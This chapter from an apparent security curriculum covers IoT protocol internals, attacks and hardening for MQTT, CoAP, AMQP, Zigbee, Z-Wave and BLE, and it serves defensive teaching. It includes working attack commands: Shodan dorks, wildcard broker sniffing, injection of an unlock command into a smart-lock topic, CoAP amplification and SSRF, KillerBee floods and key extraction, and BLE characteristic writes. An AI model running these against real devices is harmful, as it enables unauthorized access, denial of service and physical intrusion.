# Domain 28, Chapter 28A — IoT Protocol Security

> **Scope.** Application-layer IoT protocols: MQTT (CONNECT/PUBLISH/SUBSCRIBE, QoS, TLS, ACLs, broker attacks), CoAP (UDP REST, DTLS, observe, amplification), AMQP (exchanges, routing, SASL, TLS). Radio-layer IoT protocols: Zigbee (IEEE 802.15.4, NWK, APS, Trust Center, key distribution, install codes, Touchlink, KillerBee), Z-Wave (G.9959, S0/S2, downgrade attacks, SmartStart), Thread/Matter (6LoWPAN, MLE, DTLS+JPAKE, PASE/CASE, DAC, fabric model, ACLs), BLE (GAP, GATT, pairing modes, KNOB, BLURtooth, BLESA, SweynTooth), BLE Mesh (provisioning, NetKey/AppKey, relay security), LoRaWAN (OTAA/ABP, session keys, frame counters, replay, ADR spoofing, gateway impersonation). Cross-cutting: DTLS for IoT, LwM2M device management, OPC UA in IoT, protocol comparison matrix, IoT gateway security, IoT network segmentation.

---

## 1. MQTT — Message Queuing Telemetry Transport

### 1.1 Protocol internals

MQTT operates over TCP (port 1883 unencrypted, port 8883 for TLS). The protocol follows a publish/subscribe model with a central broker mediating all communication.

**CONNECT packet.** The client initiates the session with CONNECT containing: Protocol Name (`MQTT`), Protocol Level (4 for MQTT 3.1.1, 5 for MQTT 5.0), Connect Flags byte (Username flag, Password flag, Will Retain, Will QoS [2 bits], Will Flag, Clean Session/Clean Start, Reserved), Keep Alive interval (seconds), Client Identifier (mandatory, unique per broker), optional Will Topic + Will Message, optional Username + Password.

**Session persistence.** When Clean Session = 0 (MQTT 3.1.1) or Clean Start = 0 (MQTT 5.0), the broker retains session state across disconnections: active subscriptions, unacknowledged QoS 1/2 messages, pending QoS 2 flows. Persistent sessions create a state management attack surface — an attacker who takes over a client ID inherits the session's subscriptions.

**QoS levels.**

| QoS | Guarantee | Flow | Use Case |
|-----|-----------|------|----------|
| 0 | At most once (fire-and-forget) | PUBLISH only | Telemetry where loss is tolerable |
| 1 | At least once | PUBLISH → PUBACK | Sensor data requiring delivery confirmation |
| 2 | Exactly once | PUBLISH → PUBREC → PUBREL → PUBCOMP | Actuator commands, billing events |

**Retained messages.** When a message is published with the Retain flag set, the broker stores the last message for that topic. Any new subscriber to that topic immediately receives the retained message. Security implication: retained messages persist indefinitely unless overwritten — sensitive data published with retain remains accessible to future subscribers.

**Last Will and Testament (LWT).** The client can set a Will Topic and Will Message in the CONNECT packet. If the client disconnects ungracefully (TCP timeout, protocol violation), the broker publishes the Will Message to the Will Topic. An attacker who can forge CONNECT packets with crafted Will messages can inject arbitrary messages into any topic upon disconnection.

### 1.2 MQTT security model

**Authentication.** MQTT 3.1.1 supports username/password authentication in the CONNECT packet (transmitted in cleartext without TLS). MQTT 5.0 adds Enhanced Authentication (AUTH packet) supporting challenge-response mechanisms (SCRAM-SHA-256, Kerberos).

**TLS configuration (Mosquitto broker).**

```ini
# /etc/mosquitto/conf.d/tls.conf
listener 8883
cafile /etc/mosquitto/certs/ca.crt
certfile /etc/mosquitto/certs/server.crt
keyfile /etc/mosquitto/certs/server.key
tls_version tlsv1.2
ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
require_certificate true  # Mutual TLS — client cert required
```

**ACL configuration (Mosquitto).**

```
# /etc/mosquitto/acl
user sensor01
topic read device/sensor01/data
topic write device/sensor01/telemetry

user admin
topic readwrite #

# Deny all by default
pattern deny #
```

**Client certificate authentication.** When `require_certificate true` is set, the broker validates the client's X.509 certificate against the CA. The CN (Common Name) or SAN (Subject Alternative Name) can be mapped to the MQTT username for ACL enforcement: `use_identity_as_username true`.

### 1.3 MQTT attacks

**Unauthenticated broker access.** Many MQTT brokers are deployed with default configuration (no authentication, no TLS). Shodan discovery:

```bash
# Shodan dork for exposed MQTT brokers
shodan search "port:1883 MQTT"
shodan search "port:1883 product:Mosquitto"

# Direct connection test
mosquitto_sub -h <broker_ip> -p 1883 -t '#' -v
```

The wildcard topic `#` subscribes to all topics. If the broker has no ACLs, this captures every message on every topic.

**$SYS topic information leak.** Most MQTT brokers expose internal metadata via `$SYS/` topics:

```bash
# Enumerate broker metadata
mosquitto_sub -h <broker_ip> -p 1883 -t '$SYS/#' -v

# Typical $SYS topics exposed:
# $SYS/broker/version          → broker software version
# $SYS/broker/clients/total    → total connected clients
# $SYS/broker/clients/active   → currently active clients
# $SYS/broker/messages/received → total messages received
# $SYS/broker/bytes/received   → total bytes received
# $SYS/broker/uptime           → broker uptime in seconds
```

**Topic enumeration.** Without wildcard subscription:

```bash
# Subscribe with single-level wildcard per hierarchy level
mosquitto_sub -h <broker_ip> -t '+/#' -v
mosquitto_sub -h <broker_ip> -t 'device/+/command' -v
mosquitto_sub -h <broker_ip> -t 'home/+/+/status' -v
```

**Message injection.**

```bash
# Inject actuator command into a smart lock topic
mosquitto_pub -h <broker_ip> -t 'home/frontdoor/lock/set' -m '{"state":"UNLOCK"}'

# Inject false sensor data
mosquitto_pub -h <broker_ip> -t 'factory/line3/temperature' -m '{"value":22.5,"unit":"C"}'
```

**Will message abuse.** An attacker connects with a Will message targeting a sensitive topic, then forces a dirty disconnect:

```bash
mosquitto_pub -h <broker_ip> \
  --will-topic 'alerts/critical' \
  --will-payload '{"alert":"fire","zone":"warehouse"}' \
  --will-qos 1 \
  --will-retain \
  -t 'dummy' -m 'x'
# Then kill the connection abruptly — broker publishes the will message
```

**Tooling.** `mqtt-pwn` provides automated MQTT broker reconnaissance: topic discovery, message sniffing, credential bruteforce, and system topic enumeration. MQTT Explorer (GUI) provides hierarchical topic browsing and message inspection.

### 1.4 MQTT detection and hardening

**Detection — Snort/Suricata rules.**

```
# Detect MQTT CONNECT without TLS on port 1883
alert tcp any any -> any 1883 (msg:"MQTT CONNECT unencrypted"; \
  content:"|10|"; offset:0; depth:1; \
  content:"MQTT"; distance:2; within:6; \
  sid:2800101; rev:1;)

# Detect wildcard subscription '#'
alert tcp any any -> any 1883 (msg:"MQTT wildcard subscribe all topics"; \
  content:"|82|"; offset:0; depth:1; \
  content:"|00 01 23|"; sid:2800102; rev:1;)
```

**Hardening checklist.**
- Disable anonymous access: `allow_anonymous false`
- Enforce TLS on all listeners; disable port 1883
- Enforce client certificate authentication for device fleets
- Restrict `$SYS/#` topic access to admin users only
- Set per-client ACLs with least-privilege topic access
- Set `max_connections`, `max_inflight_messages`, `message_size_limit`
- Disable retained messages if not needed: `retain_available false` (MQTT 5.0)
- Monitor for abnormal subscription patterns (wildcards, rapid topic scanning)

**Case study — Volkswagen/Audi car-net (2019).** Researchers discovered unauthenticated MQTT brokers in connected car infrastructure, exposing vehicle telemetry (GPS coordinates, fuel level, lock status) via unprotected topics. CVSSv3: 7.5 (High). Remediation: authentication enforcement + TLS + topic ACLs.

---

## 2. CoAP — Constrained Application Protocol

### 2.1 Protocol internals

CoAP (RFC 7252) is a UDP-based REST protocol for constrained IoT devices. Default port: 5683 (plain), 5684 (DTLS). CoAP uses a compact binary header (4 bytes fixed) with methods mirroring HTTP:

**Header format.** Version (2 bits, always 01), Type (2 bits: CON=Confirmable, NON=Non-confirmable, ACK=Acknowledgement, RST=Reset), Token Length (4 bits, 0-8), Code (8 bits: class.detail — 0.01=GET, 0.02=POST, 0.03=PUT, 0.04=DELETE; 2.01=Created, 2.05=Content, 4.04=Not Found, 5.00=Internal Server Error), Message ID (16 bits, for deduplication and ACK matching).

**Observe option (RFC 7641).** A client registers interest in a resource with an Observe option in a GET request. The server then sends notifications whenever the resource changes — push-based telemetry without polling. Each notification carries an observe sequence number for ordering.

**Block-wise transfer (RFC 7959).** Handles payloads exceeding a single UDP datagram by splitting into numbered blocks (Block1 for request payload, Block2 for response payload). Each block is acknowledged individually. Block size negotiable: 16, 32, 64, 128, 256, 512, or 1024 bytes.

### 2.2 CoAP attacks

**Resource discovery.**

```bash
# Discover all resources via well-known URI (RFC 6690)
coap-client -m get coap://<target>:5683/.well-known/core

# Response (CoRE Link Format):
# </sensors/temp>;rt="temperature";if="sensor",
# </actuators/led>;rt="light";if="actuator",
# </firmware>;rt="update";ct=42
```

**Amplification via multicast.** CoAP multicast address `224.0.1.187` (IPv4) or `ff0x::fd` (IPv6). An attacker sends a single GET to the multicast address; every CoAP device on the network responds. With large responses and spoofed source IP, this creates a reflected amplification DDoS:

```bash
# CoAP amplification probe (using aiocoap)
python3 -m aiocoap.cli.client --non GET coap://224.0.1.187/.well-known/core
```

Amplification factor depends on response size — resource directories can return multi-kilobyte link lists from a 50-byte request.

**Proxy abuse.** CoAP proxies (forward and reverse) translate CoAP requests to HTTP or other CoAP endpoints. Misconfigured proxies enable SSRF — the attacker crafts a CoAP request with a Proxy-Uri option targeting internal resources:

```bash
coap-client -m get -O 35,coap://internal-server:5683/admin coap://<proxy>:5683
```

**Tooling.** `coap-client` (libcoap), `aiocoap` (Python asyncio CoAP library with CLI), `californium` (Eclipse Java CoAP framework with tools), `coap-cli` (Node.js).

### 2.3 CoAP detection and hardening

**Detection.** Monitor for: GET requests to `/.well-known/core` from external sources, multicast CoAP traffic on `224.0.1.187`, high-rate CoAP requests from single sources, Proxy-Uri options targeting internal addresses.

**Hardening.**
- Enforce DTLS for all CoAP communication (port 5684 only)
- Disable multicast CoAP or restrict to specific internal interfaces
- Restrict `/.well-known/core` responses to authenticated clients
- Disable or restrict CoAP proxy functionality
- Implement rate limiting at the application layer
- Use CoAP response codes to avoid leaking internal resource structure

---

## 3. AMQP — Advanced Message Queuing Protocol

### 3.1 Protocol architecture

AMQP 0-9-1 (used by RabbitMQ) defines: exchanges (receive messages from producers), queues (store messages for consumers), and bindings (routing rules from exchanges to queues). Default ports: 5672 (plain), 5671 (TLS).

**Exchange types.**

| Type | Routing Logic |
|------|--------------|
| Direct | Routes to queues with exact binding key match |
| Fanout | Routes to all bound queues (broadcast) |
| Topic | Routes by pattern match (`device.*.temperature`, `#.alert`) |
| Headers | Routes by message header attributes |

**SASL authentication.** AMQP supports SASL mechanisms: PLAIN (username/password in cleartext — require TLS), AMQPLAIN (legacy), EXTERNAL (client certificate CN), SCRAM-SHA-256 (challenge-response).

### 3.2 RabbitMQ security configuration

```ini
# /etc/rabbitmq/rabbitmq.conf

# TLS listeners
listeners.ssl.default = 5671
ssl_options.cacertfile = /etc/rabbitmq/certs/ca.crt
ssl_options.certfile = /etc/rabbitmq/certs/server.crt
ssl_options.keyfile = /etc/rabbitmq/certs/server.key
ssl_options.versions.1 = tlsv1.2
ssl_options.verify = verify_peer
ssl_options.fail_if_no_peer_cert = true

# Disable non-TLS listener
listeners.tcp = none

# Auth
auth_mechanisms.1 = EXTERNAL
auth_mechanisms.2 = PLAIN
```

**Permission model.** RabbitMQ permissions are per-vhost: `configure` (create/delete queues and exchanges), `write` (publish to exchanges), `read` (consume from queues). Set via `rabbitmqctl set_permissions -p /iot user "^device\.user\." "^device\.user\." "^device\.user\."`.

### 3.3 AMQP attacks and hardening

**Attacks.** Default credentials (`guest`/`guest` — RabbitMQ ships with this user, restricted to localhost by default but often misconfigured to allow remote access). Management UI (port 15672) exposed without TLS. Queue enumeration via management API: `GET /api/queues`. Exchange manipulation — creating bindings to exfiltrate messages.

**Hardening.**
- Delete or disable the `guest` user immediately
- Enforce TLS on all AMQP and management ports
- Restrict management UI to internal networks or VPN
- Use per-application vhosts with minimal permissions
- Enable audit logging for connection and channel events

---

## 4. Zigbee — IEEE 802.15.4 protocol deep dive

### 4.1 IEEE 802.15.4 foundation

Zigbee's physical and MAC layers are defined by IEEE 802.15.4. The 2.4 GHz band provides 16 channels (channels 11-26, each 2 MHz wide, with 5 MHz channel spacing), using O-QPSK modulation with DSSS chip encoding, yielding 250 kbps raw data rate.

**802.15.4 frame format.** The general MAC frame: Frame Control (2 bytes -- frame type [beacon/data/ACK/command], security enabled flag, frame pending, ACK request, PAN ID compression, destination/source addressing modes, frame version), Sequence Number (1 byte -- for ACK matching and duplicate detection), Addressing Fields (0-20 bytes -- destination PAN ID + destination address [16-bit short or 64-bit extended] + source PAN ID + source address), Auxiliary Security Header (0/5/6/10/14 bytes -- present if security enabled: security level [3 bits: none/MIC-32/MIC-64/MIC-128/ENC/ENC-MIC-32/ENC-MIC-64/ENC-MIC-128], key identifier mode [2 bits], frame counter [4 bytes], key identifier [0/1/5/9 bytes]), Frame Payload (variable), and FCS (2 bytes -- ITU-T CRC-16).

Security levels define the protection applied: level 0 (none), level 1 (MIC-32 -- 4-byte authentication tag, no encryption), level 2 (MIC-64), level 3 (MIC-128), level 4 (ENC -- encryption only, no integrity), level 5 (ENC-MIC-32 -- encryption + 4-byte authentication), level 6 (ENC-MIC-64), level 7 (ENC-MIC-128). Zigbee typically uses level 5 (ENC-MIC-32) for NWK frames. The encryption algorithm is AES-128-CCM* (a variant of CCM that supports encryption-only mode).

### 4.2 Zigbee NWK layer

The NWK layer adds mesh-networking capabilities: 16-bit short-address assignment (by the coordinator or parent router), AODV-based mesh routing (route discovery via broadcast RREQ, unicast RREP), and NWK-layer security (encrypting and authenticating NWK frames with the network key).

**NWK frame format.** Frame Control (2 bytes -- frame type [data/command], protocol version, discover route [suppress/enable/force], multicast flag, security, source route, destination/source IEEE address present, end device initiator), Destination Address (2 bytes, short), Source Address (2 bytes, short), Radius (1 byte -- hop count limit), Sequence Number (1 byte), Destination IEEE Address (0/8 bytes, optional), Source IEEE Address (0/8 bytes, optional), Multicast Control (0/1 byte, optional), Source Route Subframe (optional), NWK Payload (variable -- encrypted if security enabled).

**NWK security.** When NWK security is enabled, the NWK payload is encrypted with AES-128-CCM* using the network key. The Auxiliary Security Header in the NWK frame specifies: the security level, key sequence number (identifying which network key to use -- the network supports key rotation with overlap), and the frame counter (a 32-bit counter per-source, used as the nonce for AES-CCM* -- each source device maintains its own outgoing frame counter). The nonce for AES-CCM* is constructed as: source extended address (8 bytes) + frame counter (4 bytes) + security level (1 byte) = 13 bytes.

The frame counter prevents replay: the receiver rejects frames with a counter value <= the last received from that source. However, if the source device resets (power cycle), its frame counter resets to zero -- subsequent frames are rejected by all neighbors (counter is lower than the last-seen value). The device must rejoin the network to resynchronize.

### 4.3 Zigbee APS layer and key management

The APS layer provides: endpoint addressing (endpoints 1-240 are application endpoints; endpoint 0 is the ZDO -- Zigbee Device Object -- for device management), cluster-based communication (each endpoint implements clusters from the Zigbee Cluster Library -- ZCL -- defining standardized commands and attributes for specific functions: On/Off cluster, Level Control, Color Control, Door Lock, Thermostat, etc.), and security-key management.

**Key types.** The Trust Center (TC) manages two key types:

The **network key** is shared by all devices. It encrypts NWK-layer frames. Compromise of the network key compromises all NWK-layer confidentiality and integrity -- the attacker can decrypt all traffic and inject authenticated frames.

**Link keys** are shared between two specific devices (or between a device and the TC). Link keys encrypt APS-layer frames. Even if the network key is compromised, APS-layer data encrypted with link keys remains protected (assuming the link keys themselves are not compromised).

**Trust Center link key (TC link key).** A key shared between the TC and each device, used for APS-layer secure communication between the device and the TC (including network-key transport). The default TC link key for Zigbee Home Automation (ZHA) profile is the well-known value `ZigBeeAlliance09` (hex: `5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39`). Any device using this default key is vulnerable to eavesdropping of the APS-layer key-transport messages (because any attacker who knows the default TC link key can decrypt them).

### 4.4 Network key distribution -- the critical vulnerability

When a new device joins the network, the TC must distribute the network key to it. The process:

1. The joining device associates with a parent router via 802.15.4 association (MAC-layer join).
2. The parent router notifies the TC of the new device.
3. The TC decides whether to admit the device (based on policy -- open join, install-code-only join, or whitelist).
4. If admitted, the TC sends a **Transport Key** command (APS command frame) containing the network key. This frame is APS-layer encrypted with the TC link key shared between the TC and the joining device.

**The vulnerability:** If the TC link key is the well-known default (`ZigBeeAlliance09`), any attacker who is sniffing the Zigbee channel captures the Transport Key frame and decrypts it (using the known default key), obtaining the network key. With the network key, the attacker can decrypt all subsequent NWK-layer traffic and inject authenticated frames.

**Install codes.** Zigbee 3.0 requires install-code-based joining for new devices: each device has a unique install code (printed on the label, typically 6-16 bytes + 2-byte CRC). The install code is entered into the TC (via the hub's management interface). The TC derives a unique preconfigured link key from the install code using AES-MMO (Matyas-Meyer-Oseas) hash: `TCLK = AES-MMO(install_code || CRC)`. The Transport Key is encrypted with this unique TCLK -- an attacker who does not know the install code cannot derive the key and cannot decrypt the Transport Key frame.

**AES-MMO hash.** An iterated hash construction using AES-128 as the compression function: `H_0 = 0x00...0` (128-bit zero), `H_{i+1} = AES(H_i, M_i) XOR M_i`, where M_i is the i-th 128-bit block of the message (padded per the Zigbee specification). The final hash is the TCLK.

### 4.5 Zigbee 3.0 Touchlink commissioning

Touchlink (inherited from ZLL -- Zigbee Light Link) allows a device to join a network by being placed in close physical proximity to a Touchlink-capable device (the initiator). The initiator sends a Touchlink Scan Request; the target responds with a Scan Response. The initiator sends an Identify Request (causing the target to blink), then a Network Join Router/End-Device Request containing the network key -- encrypted with a Touchlink key.

Security concern: the original ZLL master key was a well-known value (shared across all ZLL devices -- it was publicly extracted from device firmware). An attacker who knows the ZLL master key and can capture the Touchlink commissioning exchange can decrypt the network key. Zigbee 3.0 deprecated the use of the ZLL master key for Touchlink and instead requires install-code-based key distribution.

### 4.6 Key extraction from firmware

If the attacker has physical access to a Zigbee device (a smart lock, a thermostat, a hub), they can extract keys from the device's non-volatile storage:

**ZBOSS stack (DSR Corporation).** Stores keys in NV (Non-Volatile) pages in flash. The NV format is a simple page-based key-value store; the network key, TC link key, and link keys are stored as specific NV items with known item IDs. Extracting the flash (via SPI dump, JTAG, or SWD -- Domain 12 Chapter 12B section 2) and parsing the NV pages reveals the keys.

**EmberZNet (Silicon Labs).** Stores keys in the EFR32's token system (a structured NV storage in the last pages of internal flash). The token IDs for security keys are documented in the EmberZNet API reference. The `em3xx_load` tool (part of the Silicon Labs SDK) can read tokens from a connected development kit. On a production device, JTAG/SWD access (if not disabled) provides the same access.

### 4.7 Zigbee attack tooling

**KillerBee** (Joshua Wright/River Loop Security): a framework for 802.15.4/Zigbee attacks. Hardware: Atmel RZUSBSTICK, TI CC2531 USB dongle (with KillerBee firmware), or ApiMote.

```bash
# Network discovery — scan all 802.15.4 channels
zbstumbler -c 11-26

# Packet capture on channel 15, write to pcap
zbdump -c 15 -w zigbee_capture.pcap

# Replay captured packet
zbreplay -r zigbee_capture.pcap -c 15

# Association flood (DoS — exhaust coordinator's association table)
zbassocflood -c 15 -p 0x1234

# Locate device via signal strength triangulation
zbfind -c 15

# Search capture for network key using known default TC link keys
zbgoodfind -r zigbee_capture.pcap -k ZigBeeAlliance09
```

**Wireshark decryption.** Edit > Preferences > Protocols > ZigBee > Security Keys > Add the network key (hex format). Wireshark then decrypts NWK-layer frames in real time.

**Attify Zigbee Framework.** GUI-based tool for sniffing, key extraction, and replay.

### 4.8 Zigbee detection and hardening

**Detection.** Monitor for: unexpected Transport Key frames (indicating new device joins — potential key-sniffing window), beacon requests from unknown sources, high-rate data frames suggesting injection, rejoin requests from devices not expected to rejoin.

**Hardening.**
- Enforce install-code-based joining (disable open join with default TC link key)
- Disable Touchlink commissioning if not required
- Use application-layer link keys for sensitive clusters (Door Lock, Thermostat)
- Monitor frame counters for gaps or resets (indicating device compromise or cloning)
- Disable JTAG/SWD on production devices (prevent key extraction)
- Implement secure boot to prevent firmware modification

**Case study — Philips Hue worm (CVE-2020-6007).** Researchers demonstrated a Zigbee worm propagating between Philips Hue smart bulbs by exploiting the Touchlink commissioning vulnerability combined with a heap overflow in the Hue bridge's color-rendering code. The attack chain: Touchlink to steal a bulb from a network, inject malicious OTA firmware update via Zigbee, gain code execution on the Hue bridge (connected to the home LAN), then pivot. CVSSv3: 7.9. CWE-122 (Heap-based Buffer Overflow).

---

## 5. Z-Wave — in depth

### 5.1 Protocol architecture

Z-Wave operates at 868.42 MHz (EU), 908.42 MHz (US), or 921.42 MHz (AU/NZ) with FSK modulation. Data rates: 9.6 kbps, 40 kbps, or 100 kbps (Z-Wave Plus). The standard is proprietary (managed by the Z-Wave Alliance, now part of Silicon Labs); the ITU-T G.9959 standard defines the PHY and MAC layers.

**Network topology.** A Z-Wave network has one primary controller (which assigns node IDs and manages the network), optional secondary controllers, and up to 232 nodes. The controller maintains a routing table. Z-Wave uses source routing: the controller computes the route and includes it in the frame header (up to 4 hops). Z-Wave Long Range (Z-Wave LR, introduced in 2020) extends range to 1.6 km with star topology (no mesh).

**Frame format.** Home ID (4 bytes -- identifies the network, randomly generated by the primary controller during network creation), Source Node ID (1 byte), Frame Control (1 byte -- routed/multicast/ACK-request flags, header type, beam control), Length (1 byte), Destination Node ID (1 byte), Command Class (1 byte -- identifies the function: 0x25 = Switch Binary, 0x62 = Door Lock, 0x71 = Notification, 0x98 = Security S0, 0x9F = Security S2), Command (1 byte -- specific operation within the class), Command Parameters (variable), Checksum (1 byte -- XOR of all preceding bytes).

### 5.2 S0 security -- detailed mechanics

S0 (Security Command Class 0x98) provides AES-128-OFB encryption and AES-128-CBC-MAC authentication for command-class frames.

**Key establishment during inclusion.** The controller sends the network key to the new node using the S0 Security Message Encapsulation with a temporary key. The temporary key is derived from the controller's and node's random nonces -- but critically, the initial key-exchange messages (Scheme Get, Scheme Report) are sent in cleartext, and the temporary key used to encrypt the network-key transfer is a well-known value: `0x00...00` (16 zero bytes). This means an attacker who captures the S0 inclusion process obtains the network key trivially.

**S0 frame structure.** Security Message Encapsulation (Command Class 0x98, Command 0x81): Sender's Nonce (8 bytes), Encrypted Payload (variable -- the encapsulated command class and parameters, encrypted with AES-128-OFB using the network key and the concatenation of sender's nonce + receiver's nonce as the IV), Receiver's Nonce Identifier (1 byte -- references a previously-exchanged nonce), MAC (8 bytes -- AES-128-CBC-MAC over the header + encrypted payload + nonce).

**Nonce management.** Before sending an S0-encrypted frame, the sender requests a nonce from the receiver (`Nonce Get` command). The receiver generates a random 8-byte nonce and sends it back (`Nonce Report`). The sender uses the nonce (combined with its own nonce) as the IV for encryption. The nonce is single-use -- each encrypted frame requires a fresh nonce exchange, adding latency (two extra frames per encrypted command).

### 5.3 S2 security -- detailed mechanics

S2 (Security 2 Command Class 0x9F) provides significantly stronger security:

**ECDH key exchange during inclusion.** The controller and the joining node perform an ECDH key exchange (using Curve25519). The shared secret is derived without transmitting key material over the air (unlike S0, where the network key is transmitted encrypted with a known key). The ECDH public keys are exchanged in cleartext, but the shared secret is computed locally by each party.

**DSK (Device-Specific Key) verification.** The DSK is a 16-byte value printed on the device label (or provided via QR code). During inclusion, the controller displays a challenge (the first 2 bytes of the device's public key, derived from the DSK); the user verifies or enters these bytes on the controller's interface. This authenticates the ECDH exchange (preventing MitM -- a MitM who substitutes their own public key would not match the DSK-derived challenge).

**S2 security levels.** S2 Unauthenticated: ECDH without DSK verification -- the user does not enter any code. Vulnerable to MitM (the attacker can substitute their own public key during the ECDH exchange). S2 Authenticated: ECDH with DSK verification -- the user enters part of the DSK. MitM-resistant. S2 Access Control: ECDH with full DSK verification -- intended for high-security devices (door locks, alarm systems).

**S2 frame structure.** Security 2 Message Encapsulation: Sequence Number (1 byte), Extensions (optional -- Sender's Entropy Input for nonce synchronization, MPAN for multicast), Encrypted Extensions + Encrypted Command (variable -- encrypted with AES-128-CCM using a span-nonce [Sender-Peer Authentication Nonce] derived from the shared secret and per-frame counters), Authentication Tag (8 bytes -- from AES-CCM).

**S2 nonce management.** S2 uses the SPAN (Sender-Peer Authentication Nonce) mechanism: the sender and receiver maintain synchronized nonce states, eliminating the need for per-frame nonce exchanges (unlike S0). The SPAN is derived from: the ECDH shared secret, a counter (incremented with each frame), and entropy inputs exchanged periodically. This reduces the latency overhead (no Nonce Get/Report round-trip for each frame).

### 5.4 Downgrade attacks

If a controller is configured to accept both S0 and S2 devices, an attacker can attempt to force S0 inclusion:

1. The attacker jams the S2 inclusion exchange (transmitting on the Z-Wave frequency to corrupt the S2 handshake frames).
2. The controller falls back to S0 inclusion (sending the S0 Scheme Get).
3. The attacker captures the S0 inclusion (with the trivially-decryptable network-key transport) and obtains the network key.

Defense: the controller should refuse to include an S2-capable device at the S0 level (the device's capability is indicated in its Node Information Frame -- NIF -- which lists supported command classes). If the NIF indicates S2 support but the inclusion proceeds at S0, the controller should reject it. SmartStart (a Z-Wave Alliance feature) further mitigates downgrade by pre-provisioning devices via QR code scanning before inclusion -- the controller knows the expected security level in advance.

### 5.5 Z-Wave attack tooling and hardening

**Tools.** EZWave (Z-Wave SDR framework for sniffing and injection), Scapy-radio (Scapy extension for sub-GHz radio protocols including Z-Wave), Z-Wave JS (open-source Z-Wave driver with full S2 support -- useful for protocol analysis and controller emulation).

**Detection.** Monitor for: S0 Scheme Get/Report during inclusion of S2-capable devices (downgrade attempt), Nonce Get floods (DoS against S0 nonce management), unexpected Node Information Frames (rogue device announcement).

**Hardening.**
- Require S2 Authenticated or S2 Access Control for all security-sensitive devices
- Disable S0 fallback on the controller
- Use SmartStart for pre-provisioned inclusion
- Monitor for unexpected inclusion events (new node IDs appearing)

**Case study -- S0 key theft in production (2017).** Pen Test Partners demonstrated real-time interception of the S0 key exchange on Yale smart door locks during inclusion using an RTL-SDR and custom Z-Wave demodulator. The network key was extracted in under 10 seconds. CVSSv3: 8.1 (High). CWE-311 (Missing Encryption of Sensitive Data).

---

## 6. BLE — Bluetooth Low Energy

### 6.1 Protocol stack

BLE (Bluetooth 4.0+) stack layers relevant to security:

**GAP (Generic Access Profile).** Defines device roles (Peripheral, Central, Broadcaster, Observer), discoverability modes, and connection establishment. A Peripheral advertises; a Central scans and initiates connections.

**GATT (Generic Attribute Profile).** Defines the service/characteristic data model. Services group related characteristics (e.g., Heart Rate Service 0x180D). Each characteristic has: a handle (16-bit address), a UUID (16-bit SIG-defined or 128-bit custom), properties (read, write, notify, indicate), and optionally a Client Characteristic Configuration Descriptor (CCCD) for enabling notifications.

**ATT (Attribute Protocol).** Request/response protocol underlying GATT. Operations: Read Request/Response, Write Request/Response, Write Command (no response), Handle Value Notification (server-initiated), Handle Value Indication (server-initiated, client-confirmed).

**L2CAP (Logical Link Control and Adaptation Protocol).** Provides connection-oriented and connectionless channels. Fixed channel IDs: 0x0004 (ATT), 0x0005 (LE Signaling), 0x0006 (Security Manager Protocol).

### 6.2 BLE pairing modes

**Just Works.** No user interaction for authentication. ECDH key exchange (BLE 4.2+ Secure Connections) or temporary key = 0 (BLE 4.0/4.1 Legacy Pairing). Provides encryption but no MitM protection -- an active attacker can intercept the pairing.

**Passkey Entry.** One device displays a 6-digit passkey; the user enters it on the other device. Provides MitM protection (the attacker must guess the passkey -- 1-in-1M probability per attempt in Secure Connections mode).

**Numeric Comparison (BLE 4.2+ Secure Connections only).** Both devices display a 6-digit number; the user confirms they match. ECDH-authenticated -- MitM-resistant.

**Out-of-Band (OOB).** Authentication data exchanged via an external channel (NFC tap, QR code). Strongest MitM protection when the OOB channel is physically constrained.

### 6.3 BLE attacks

**GATT enumeration and characteristic manipulation.**

```bash
# Scan for BLE devices
bluetoothctl
> scan on
# Note the target MAC address

# Enumerate services and characteristics
gatttool -b <MAC> --primary
gatttool -b <MAC> --characteristics

# Read a characteristic value
gatttool -b <MAC> --char-read -a 0x000e

# Write to a characteristic (e.g., unlock command)
gatttool -b <MAC> --char-write-req -a 0x000e -n 01
```

**Bettercap BLE module.**

```bash
# BLE reconnaissance
sudo bettercap

> ble.recon on
> ble.show

# Enumerate a specific device
> ble.enum <MAC>

# Write to a characteristic
> ble.write <MAC> <handle> <hex_data>
```

**KNOB -- Key Negotiation of Bluetooth (CVE-2019-9506).** Affects Bluetooth BR/EDR (Classic Bluetooth), not BLE. The attacker forces the encryption key entropy to be reduced to 1 byte during the key negotiation phase of the LMP (Link Manager Protocol) handshake. The Bluetooth specification allowed negotiation down to 1 byte of entropy (7 bits effective). With 1-byte entropy, the attacker brute-forces the key in real time. CVSSv3: 9.3. CWE-327. Fix: enforce minimum 7-byte entropy in LMP negotiation. Note: listed here because many IoT devices use Classic BT alongside BLE, and dual-mode adapters are affected.

**BLURtooth (CVE-2020-15802).** Affects Cross-Transport Key Derivation (CTKD) in dual-mode (BR/EDR + BLE) devices. CTKD allows keys generated during pairing on one transport (e.g., BLE) to be used on the other (BR/EDR). An attacker who pairs with the device on BLE using Just Works (no MitM protection) can derive a key valid for BR/EDR, effectively bypassing BR/EDR's stronger pairing authentication. CVSSv3: 5.3. CWE-287.

**BLESA -- BLE Spoofing Attacks (2020).** Targets the BLE reconnection process. After an established connection is dropped, the reconnection on many BLE stacks does not re-authenticate the peripheral. The attacker spoofs the peripheral's MAC address and reconnects to the central with forged GATT data. Affected: Linux BlueZ, Android, iOS (patched in iOS 13.4). CWE-287.

**SweynTooth (2020).** A family of 12 BLE implementation vulnerabilities across 7 major SoC vendors (TI, NXP, Cypress, Dialog, STMicroelectronics, Microchip, Telink). Vulnerabilities include: zero-LTK installation (allows unauthenticated encryption), truncated L2CAP (crash/deadlock), invalid channel map (deadlock), sequential ATT deadlock. Affects medical devices (pacemakers, insulin pumps, glucose monitors). Multiple CVEs. CWE-120, CWE-415, CWE-787.

**Tooling.** `gatttool` (BlueZ), `bluetoothctl` (BlueZ interactive), `bettercap` (BLE recon/enum/write), `nRF Connect` (Nordic mobile app for GATT browsing and interaction), `ubertooth` (open-source Classic BT sniffer hardware -- can capture BLE advertising channels on legacy firmware).

### 6.4 BLE detection and hardening

**Detection.** Monitor for: unexpected BLE scanning activity from unknown centrals, repeated pairing attempts (passkey brute-force), connection requests with abnormally low entropy parameters, MAC address spoofing patterns (same MAC advertising from different physical locations).

**Hardening.**
- Require Secure Connections pairing (BLE 4.2+) -- disable Legacy Pairing
- Use Passkey Entry or Numeric Comparison -- never Just Works for security-sensitive devices
- Implement application-layer authentication on top of BLE pairing
- Disable CTKD on dual-mode devices, or enforce Authenticated pairing on both transports
- Require bonding (store LTK) and re-authenticate on reconnection
